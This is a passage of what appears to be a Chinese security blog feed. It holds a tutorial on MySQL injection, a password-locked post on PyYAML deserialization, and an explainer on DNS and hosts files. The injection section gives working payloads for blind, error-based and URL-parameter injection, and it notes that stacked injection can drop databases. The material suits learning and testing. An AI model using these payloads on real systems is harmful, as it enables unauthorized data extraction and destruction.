<code>4</code></li></ul></li></ul><h3 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h3><ol><li><p><strong>COUNT()</strong></p><ul><li><p>统计行数或非 NULL 值的数量。</p></li><li><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- 统计总行数（包括NULL）<br>select count(*) from orders;<br><br>-- 统计某列非NULL值的数量<br>select count(product_id) from products;<br><br>-- 统计唯一值数量<br>select count(distinct user_id) from logs;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>SUM()</strong></p><ul><li><p>计算数值列的总和（忽略 NULL）。</p></li><li><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select sun(revenue) from sales;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>AVG()</strong></p><ul><li><p>计算数值列的平均值（忽略 NULL）。</p></li><li><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select avg(score) from exams;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>MAX()</strong> 和 <strong>MIN()</strong></p><ul><li><p>返回列中的最大&#x2F;最小值（支持数值、日期、字符串）。</p></li><li><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select max(temperature), min(temperature) from weather;<br></code></pre></td></tr></table></figure></li></ul></li></ol><h3 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h3><ul><li><p>greatest：</p><ul><li><p>返回 a, b 中最大的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">greatest(a, b)<br></code></pre></td></tr></table></figure><ul><li>a、b：任意值</li></ul></li></ul></li><li><p>rand：</p><ul><li><p>返回 0~1 之间随机的浮点值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">rand(a)<br></code></pre></td></tr></table></figure><ul><li>a：可选参数；随机数种子；可为任意值</li></ul></li></ul></li><li><p>load_file</p><ul><li><p>读取文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">load_file(path)<br></code></pre></td></tr></table></figure><ul><li>path：文件路径，一般转为 16 进制防止特殊字符出问题</li></ul></li></ul></li><li><p>extractvalue</p><ul><li><p>对 XML 文档进行查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">extractvalue(xmlfile，path)<br></code></pre></td></tr></table></figure><ul><li>xmlfile：xml 文件</li><li>path：xpath</li></ul></li></ul></li><li><p>updatexml</p><ul><li><p>更新 xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">updatexml(xmlfile，path, content)<br></code></pre></td></tr></table></figure><ul><li>xmlfile：xml 文件</li><li>path：xpath</li><li>content：更新的内容</li></ul></li></ul></li></ul><h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><p>到此为止，我们基本上复习了一下 MySQL 注入相关的知识，接下来看看有哪些类型的注入。</p><h3 id="常规注入"><a href="#常规注入" class="headerlink" title="常规注入"></a>常规注入</h3><p>注入后直接回显结果</p><p>有点多写好了贴这里</p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>类型</p><ul><li>布尔</li><li>时间</li><li>其他（报错、响应代码等等）</li></ul><p>盲注就是在 sql 注入过程中，数据无回显。此时，我们需要利用一些方法进行判断注入是否成功，这个方法称之为盲注。</p><p>盲注实际上是根据执行成功与失败的现象不同，导致攻击者能够获取到信息。最简单的是布尔型的，通过比较运算符来获得信息，比较结果要么是 True，要么是 False，两种返回的数据不同。那么如果不管是 True 还是 False，页面返回的都一样的话，就只能用基于时间的盲注，加入特定的时间函数，通过时间差来判断注入的语句是否正确。</p><p>从上面可以看出，只要注入成功与失败的返回数据不同，我们就可以获取到数据库的信息。至于返回的数据到底怎么个不同法，则有很多种可能。</p><p>利用方式</p><ol><li><p>基于布尔<br>利用字符串相关的函数，逐个字符猜解需要的信息即可</p></li><li><p>基于时间</p><ul><li><p>利用 <code>if</code>、<code>case</code>等与时延函数搭配，逐个字符猜解需要的信息</p></li><li><p>利用字符串提前与定位将字符转为数字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where user=&#x27;&#x27; or sleep(locate(substr(user(), 1, 1), &#x27;a&#x27;));<br>select * from users where user=&#x27;&#x27; or sleep(locate(substr(user(), 1, 1), &#x27;b&#x27;));<br>...<br>select * from users where user=&#x27;&#x27; or sleep(locate(substr(user(), 1, 1), &#x27;r&#x27;));<br># 出现时延，代表第一个字符为 r<br></code></pre></td></tr></table></figure><p>同理可以获取所有位数。此法无需 if 等条件语句。</p><p>同样还可以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where user=&#x27;&#x27; or sleep(replace(substr(user(), 1, 1), &#x27;a&#x27;, 1));<br>select * from users where user=&#x27;&#x27; or sleep(replace(substr(user(), 1, 1), &#x27;b&#x27;, 1));<br>...<br>select * from users where user=&#x27;&#x27; or sleep(replace(substr(user(), 1, 1), &#x27;r&#x27;, 1));<br># 出现时延，代表第一个字符为 r<br></code></pre></td></tr></table></figure><p>判断长度也可以这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where user=&#x27;&#x27; or sleep(length(database())-1);<br>select * from users where user=&#x27;&#x27; or sleep(length(database())-2);<br>...<br>select * from users where user=&#x27;&#x27; or sleep(length(database())-14);<br># 没有时延说明长度为 14<br></code></pre></td></tr></table></figure></li></ul><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>利用 MySQL 的一些特殊语法触发错误，错误中常常带着一些数据库信息，从而造成信息泄露，达到注入的目的。以下是几个常见的 payload：</p><blockquote><p>floor + rand + count + group by 组合拳</p></blockquote><p>先说 <code>group by</code>。当 <code>group by</code> 与聚合函数（这里是 count）一起使用的时候，MySQL 会为查询结果建立一个虚拟的表。这个表你可以按照 Python 的里的字典理解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">tmp_table = &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>与字典类似，这个临时的表不能创建相同的键，出现了就报错；如果出现相同的值，则累加。举例：<br>假如查出了一个新的值 a，那么 MySQL 先找一下临时表中有没有这个 a 键，有的话更新对于的值；否则创建一个新的键。如果创建新的键的时候发现已经存在这个键了，则会报错。那么问题来了，创建键的之前明明有对键的存在进行判断，为什么创建的时候还会出现存在呢？因为判断的时候 MySQL 会进行一次查询，而创建的时候又会查一下，相当于重复查了 2 次。又因为 <code>rand</code> 函数每次运行的结果不同，便导致了判断与创建的键会不一致的情况。</p><p>当然，0~1 之间的随机浮点数结果太多了，需要限制一下来提高几率，这就是 <code>floor(rand()*2)</code> 的作用，将随机结果限制为2种，要么 0 要么 1。<br>举例说明，当 <code>group by</code> + <code>floor(rand(0)*2)</code> 的时候：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select floor(rand(0)*2) from information_schema.tables limit 0, 5;<br>+------------------+<br>| floor(rand(0)*2) |<br>+------------------+<br>|                0 |<br>|                1 |<br>|                1 |<br>|                0 |<br>|                1 |<br>+------------------+<br>5 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>结果解释：</p><ol><li>第一次查询，随机数为 0，<code>group by</code> 拿到键 0，判断键 0 不在临时表后，尝试新建键，这时消耗了一个随机数 1，所以这个时候实际上新建的键的是 1。</li><li>第二次查询，随机数为 1，<code>group by</code> 拿到键 1，判断键 1 在临时表后，更新键 1 对应的值。</li><li>第三次查询，随机数为 0，<code>group by</code> 拿到键 0，判断键 0 不在临时表后，尝试新建键，这时消耗了一个随机数 1，所以这个时候实际上新建的键的是 1，但是键 1已经存在，所以 MySQL 报错：<code>ERROR 1062 (23000): Duplicate entry &#39;1&#39; for key &#39;&lt;group_key&gt;&#39;</code></li></ol><p>验证如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users;<br>+------+----------+----------+<br>| id   | user     | password |<br>+------+----------+----------+<br>|    1 | admin    | admin    |<br>|    2 | root     | password |<br>|    3 | username | 123456   |<br>+------+----------+----------+<br>3 rows in set (0.00 sec)<br><br>mysql&gt; select count(*) from users group by (floor(rand(0)*2));<br>ERROR 1062 (23000): Duplicate entry &#x27;1&#x27; for key &#x27;&lt;group_key&gt;&#x27;<br><br></code></pre></td></tr></table></figure><p>实际上，group by 的次数与列数密切相关，也就是说，如果将 <code>users</code> 表改为 2列，则不会报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users;<br>+------+-------+----------+<br>| id   | user  | password |<br>+------+-------+----------+<br>|    1 | admin | admin    |<br>|    2 | root  | password |<br>+------+-------+----------+<br>2 rows in set (0.00 sec)<br><br>mysql&gt; select count(*) from users group by (floor(rand(0)*2));<br>+----------+<br>| count(*) |<br>+----------+<br>|        2 |<br>+----------+<br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>剩下的，就是怎么利用报错将需要的数据带出来。报错中的 <code>1</code> 实际上就是 <code>floor(rand(0)*2)</code> 的结果，所以只需要将数据与 <code>floor(rand(0)*2)</code> 连接起来就可以带出来了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select count(*) from users group by concat((floor(rand(0)*2)), &quot;~&quot;,version());<br>ERROR 1062 (23000): Duplicate entry &#x27;1~5.7.24&#x27; for key &#x27;&lt;group_key&gt;&#x27;<br></code></pre></td></tr></table></figure><p>实战示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=1 or 1 group by concat((floor(rand(0)*2)), &quot;~&quot;, version()) -- #<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">version() 也可以为 group_concat( select 语句 )<br></code></pre></td></tr></table></figure><blockquote><p>xml</p></blockquote><p>利用 xml 的 xpath 语法错误来报错。</p><p><strong>extractvalue</strong>: extractvalue 在查不到数据的时候返回空，xpath 语法错误的时候则会报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select extractvalue(&#x27;123&#x27;, &#x27;/&#x27;);<br>+--------------------------+<br>| extractvalue(&#x27;123&#x27;, &#x27;/&#x27;) |<br>+--------------------------+<br>| 123                      |<br>+--------------------------+<br>1 row in set (0.00 sec)<br><br>mysql&gt; select extractvalue(&#x27;123&#x27;, &#x27;/a&#x27;);<br>+---------------------------+<br>| extractvalue(&#x27;123&#x27;, &#x27;/a&#x27;) |<br>+---------------------------+<br>|                           |<br>+---------------------------+<br>1 row in set (0.00 sec)<br><br>mysql&gt; select extractvalue(&#x27;123&#x27;, &#x27;~&#x27;);<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~&#x27;<br></code></pre></td></tr></table></figure><p><strong>updatexml</strong>：与 extractvalue 类似。</p><p>注意，这两种报错注入，能够提取的最长字符串为 32 个字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select extractvalue(&#x27;123&#x27;, &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;);<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;<br>mysql&gt; select updatexml(&#x27;123&#x27;, &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;, &#x27;1&#x27;);<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;<br></code></pre></td></tr></table></figure><p>~替换为select语句</p><p>实战示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users where id=1 and extractvalue(&#x27;&#x27;, concat(&#x27;~&#x27;, database(), &#x27;~&#x27;));<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~test~&#x27;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users where id=1 and updatexml(&#x27;&#x27;, concat(&#x27;~&#x27;, database(), &#x27;~&#x27;), &#x27;&#x27;); <br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~test~&#x27;<br></code></pre></td></tr></table></figure><blockquote><p>其他函数</p></blockquote><p>上面这几个仅仅是比较常见的函数，实际上还有很多不常见的</p><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>利用 <code>union</code> 来拼接 select 语句。主要是判断列数。</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>MySQL 语句中的 <code>;</code> 代表一个语句结束。如果 <code>;</code> 之后的语句也能执行，那么就可以拼接任意语句，包括<code>drop database</code>。</p><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎不支持的限制，当然了权限不足也是有可能的</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
      <tag>盲注骚操作</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化(PyYAML)</title>
    <link href="/tuyi/2025/01/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-PyYAML/"/>
    <url>/tuyi/2025/01/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-PyYAML/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7869322cd2f3a4a47a6667fc040f32d0d4ce37f56b1f92c983f21d9058994578">7389a4e37e9dabc8af72228f567f583bc6e4d75b1af1692aeba085d25c8638eb</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/tuyi/lib/hbe.js"></script><link href="/tuyi/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PyYAML</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DNS</title>
    <link href="/tuyi/2025/01/27/%E8%AE%BADNS/"/>
    <url>/tuyi/2025/01/27/%E8%AE%BADNS/</url>
    
    <content type="html"><![CDATA[<h1 id="DNS的起源"><a href="#DNS的起源" class="headerlink" title="DNS的起源"></a>DNS的起源</h1><p>借助ai使用一个故事来解释DNS的起源：</p><h2 id="第一章：混乱的“电话簿”时代"><a href="#第一章：混乱的“电话簿”时代" class="headerlink" title="第一章：混乱的“电话簿”时代"></a><strong>第一章：混乱的“电话簿”时代</strong></h2><p>1980年代初，互联网还像一个刚刚兴起的小镇，名叫“阿帕镇”（ARPANET）。镇上的居民（计算机）虽然不多，但彼此通信全靠一本<strong>纸质电话簿</strong>——名为 <code>hosts.txt</code> 的文件。<br>这本电话簿由镇上的“管理员爷爷”（斯坦福研究院的SRI-NIC）手写维护，每新增一台设备，爷爷就得熬夜更新，再派人骑马送到每户人家。<br>可随着镇子扩大，问题来了：</p><ul><li>新住户暴增，电话簿越来越厚，骑马送书的速度赶不上变化。</li><li>有人家地址改了，邻居却还在用旧电话簿，信全寄丢了！</li><li>爷爷累倒了，全镇通信濒临瘫痪……</li></ul><hr><h2 id="第二章：天才少年的灵感"><a href="#第二章：天才少年的灵感" class="headerlink" title="第二章：天才少年的灵感"></a><strong>第二章：天才少年的灵感</strong></h2><p>一天，镇上的年轻工程师<strong>保罗·莫卡佩特里斯</strong>（Paul Mockapetris）在酒馆喝酒，听到有人抱怨：“要是电话簿能自动更新，还能分区域管理就好了！”<br>他灵光一闪，掏出一张皱巴巴的草纸，画下了一个<strong>分层地址系统</strong>的设计图：</p><ol><li><strong>总机（根服务器）</strong>：只记录每个“大区”的接线员是谁。</li><li><strong>区域分机（顶级域服务器）</strong>：比如 <code>.com</code> 区、<code>.edu</code> 区，负责管理下属街道。</li><li><strong>街道分机（权威服务器）</strong>：直接保管每户人家的最新地址。</li></ol><p>他兴奋地大喊：“不再需要一本大书！问路的人按层级查询，就像打电话转接分机！”</p><hr><h2 id="第三章：DNS系统的诞生"><a href="#第三章：DNS系统的诞生" class="headerlink" title="第三章：DNS系统的诞生"></a><strong>第三章：DNS系统的诞生</strong></h2><p>保罗连夜说服镇长（互联网工程组IETF），在小镇试点新系统——<strong>DNS（域名系统）</strong>。</p><ul><li><strong>域名</strong>：每户人家有了易记的名字，比如 <code>面包店.example.com</code>。</li><li><strong>解析流程</strong>：<ol><li>居民问总机：“<code>.com</code> 区谁管？”</li><li>总机回答：“去问 <code>.com</code> 区分机！”</li><li><code>.com</code> 区分机说：“<code>example.com</code> 街道归保罗家的服务器管！”</li><li>最终，保罗家的服务器给出“面包店”的IP地址：<code>192.0.2.1</code>。</li></ol></li></ul><p><strong>奇迹发生了</strong>：</p><ul><li>地址簿自动更新，再也不用全镇派送！</li><li>查询速度快如闪电，迷路的人越来越少。</li><li>小镇扩张成超级城市（互联网），DNS成了看不见的“导航员”。</li></ul><hr><h2 id="尾声：小镇的遗产"><a href="#尾声：小镇的遗产" class="headerlink" title="尾声：小镇的遗产"></a><strong>尾声：小镇的遗产</strong></h2><p>多年后，阿帕镇成了全球互联网，DNS系统默默支撑着亿万次查询。</p><ul><li><strong>根服务器</strong>像守护神，全球仅有13组（镜像遍布各地）。</li><li><strong>层级管理</strong>让每个社区（域名）自治，无需中央集权。</li><li>保罗的名字被刻在“互联网名人堂”，而那本旧电话簿，成了博物馆里的古董。</li></ul><hr><h2 id="隐喻解读"><a href="#隐喻解读" class="headerlink" title="隐喻解读"></a><strong>隐喻解读</strong></h2><ul><li><strong>电话簿</strong> <code>hosts.txt</code> → 早期静态主机文件</li><li><strong>总机→区域分机→街道分机</strong> → DNS根服务器→顶级域→权威服务器</li><li><strong>骑马送书</strong> → 手动更新主机文件的低效</li><li><strong>分层查询</strong> → DNS递归&#x2F;迭代解析流程</li></ul><p>在早期计算机系统的通信不便下，这便成就了DNS</p><h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><h2 id="区域"><a href="#区域" class="headerlink" title="区域"></a>区域</h2><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20200914104025076.png" alt="20200914104025076"></p><p>其中顶级域（TLD）有 <code>arpa</code>、<code>com</code>、<code>edu</code>、<code>gov</code>…</p><p>顶级域分为两种类型：</p><ol><li><code>gTLDs</code>: <code>.com</code>、<code>.org</code> 等叫做<code>一般通用顶级域</code></li><li><code>ccTLDs</code>: <code>.cn</code>、<code>.jp</code> 等叫做<code>国家顶级域</code></li><li><code>arpa</code>：特殊域，比较特殊放在下面讲</li></ol><p>一个 DNS 子树（独立管理的）就称为一个<code>区域</code>，举个例子，比如 <code>sina.com.cn</code> 这个二级域，可以将它的区域划分为更小的区域，比如一般会根据用途来划分区域，假设 <code>blog.sina.com.cn</code> 为博客相关的域名等等。划分完子区域之后，需要经过父区域的授权，这样父区域遇到属于子区域下的域名，就会转给子区域来解析。</p><h3 id="查询方式"><a href="#查询方式" class="headerlink" title="查询方式"></a>查询方式</h3><p>在说流程之前，先说一下查询方式。很简单，分为 2 种：</p><ol><li>递归查询：A -&gt; B -&gt; C，A 向 B 发起 DNS 解析的请求之后，B 帮 A 去 C 那里查找，拿到结果之后返回给 A，这个时候 A、B 各发起了一次解析请求。</li><li>迭代查询：A -&gt; B, A -&gt; C，A 向 B 发起 DNS 解析的请求之后，B 告诉 A 要去 C 那里查找，A 再向 C 发起 DNS 解析请求，这个时候 A 一共发起了两次解析请求，B 没有发起 DNS 解析请求。</li></ol><h2 id="Hosts-文件（静态-DNS-服务器）"><a href="#Hosts-文件（静态-DNS-服务器）" class="headerlink" title="Hosts 文件（静态 DNS 服务器）"></a>Hosts 文件（静态 DNS 服务器）</h2><p>在windows下的hosts文件存放在<code>C:\Windows\System32\drivers\etc\hosts</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># Copyright (c) 1993-2009 Microsoft Corp.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This is a sample HOSTS file used by Microsoft TCP/IP for Windows.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This file contains the mappings of IP addresses to host names. Each</span><br><span class="hljs-comment"># entry should be kept on an individual line. The IP address should</span><br><span class="hljs-comment"># be placed in the first column followed by the corresponding host name.</span><br><span class="hljs-comment"># The IP address and the host name should be separated by at least one</span><br><span class="hljs-comment"># space.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Additionally, comments (such as these) may be inserted on individual</span><br><span class="hljs-comment"># lines or following the machine name denoted by a &#x27;#&#x27; symbol.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># For example:</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#      102.54.94.97     rhino.acme.com          # source server</span><br><span class="hljs-comment">#       38.25.63.10     x.acme.com              # x client host</span><br><br><span class="hljs-comment"># localhost name resolution is handled within DNS itself.</span><br><span class="hljs-comment">#127.0.0.1       localhost</span><br><span class="hljs-comment">#::1             localhost</span><br><span class="hljs-comment"># Added by Docker Desktop</span><br><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span> host.docker.internal<br><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span> gateway.docker.internal<br><span class="hljs-comment"># To allow the same kube context to work on the host and the container:</span><br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> kubernetes.docker.internal<br><span class="hljs-comment"># End of section</span><br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> localhost<br></code></pre></td></tr></table></figure><p>在linux下可以访问&#x2F;etc&#x2F;hosts查看</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs elixir"> cat /etc/hosts<br><span class="hljs-comment"># This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to /etc/wsl.conf: #使用的是wsl子系统</span><br><span class="hljs-comment"># [network]</span><br><span class="hljs-comment"># generateHosts = false</span><br><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>       localhost<br><span class="hljs-number">127.0</span>.<span class="hljs-number">1.1</span>       <span class="hljs-title class_">DESKTOP</span>-<span class="hljs-title class_">D9FG48B</span>.        <span class="hljs-title class_">DESKTOP</span>-<span class="hljs-title class_">D9FG48B</span><br><br><span class="hljs-comment"># The following lines are desirable for IPv6 capable hosts</span><br>::<span class="hljs-number">1</span>     ip6-localhost ip6-loopback<br>fe00::<span class="hljs-number">0</span> ip6-localnet<br>ff00::<span class="hljs-number">0</span> ip6-mcastprefix<br>ff02::<span class="hljs-number">1</span> ip6-allnodes<br>ff02::<span class="hljs-number">2</span> ip6-allrouters<br></code></pre></td></tr></table></figure><p>可以看见<code>127.0.01</code>被映射到<code>localhost</code> 其实访问<code>127.0.0.1</code>就是在房访问<code>localhost</code></p><p>Hosts 文件，可以直接理解为是本地静态的 DNS 服务器。需要解析 DNS 的时候，系统会首先自动从 Hosts 文件中寻找对应的 ip-域名 映射关系，一旦找到那么就完成解析了，如果没有找到，则继续解析流程。优先级高于网络DNS解析服务，所有可以加快域名解析、屏蔽垃圾网站、广告等等</p><h2 id="LocalDNS-服务器"><a href="#LocalDNS-服务器" class="headerlink" title="LocalDNS 服务器"></a>LocalDNS 服务器</h2><p>若 Hosts 文件中没有相关域名的记录，则来到了 LocalDNS。</p><p>在windows中，如果 <code>hosts</code> 文件中没有相关域名的记录，系统会依赖本地网络配置中的 DNS 服务器进行域名解析。Windows 的本地 DNS 配置存储在 <strong>网络适配器的设置中</strong>无法具体呈现，</p><p>但是在linux中可以看一下这个文件：<code>/etc/resolv.conf</code>:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cat</span> /etc/resolv.<span class="hljs-keyword">conf</span><br># This <span class="hljs-keyword">file</span> was automatically generated by WSL. To <span class="hljs-keyword">stop</span> automatic generation of this <span class="hljs-keyword">file</span>, <span class="hljs-built_in">add</span> the following entry <span class="hljs-keyword">to</span> /etc/wsl.<span class="hljs-keyword">conf</span>:<br># [network]<br># generateResolvConf = false<br>nameserver <span class="hljs-number">10</span>.xxx.xxx.xxx<br></code></pre></td></tr></table></figure><p>这个文件一般是自动生成的，什么时候生成的呢？DHCP(动态主机配置协议) 的时候。需要注意的是，这个文件里的 ip 经常是内网 ip，并且 LocalDNS 里面有个 “local”，大家可能会认为 LocalDNS 的服务器 ip 都是内网 ip，实际上也可以是外网 ip，比如其他组织提供的 DNS，像谷歌的<code>8.8.8.8</code>啦，国内的<code>114.114.114.114</code>啦。个人感觉是这些 DNS 的地址填写在我们本地的电脑或者移动设备上，所以称为 LocalDNS</p><p>需要注意的是，LocalDNS 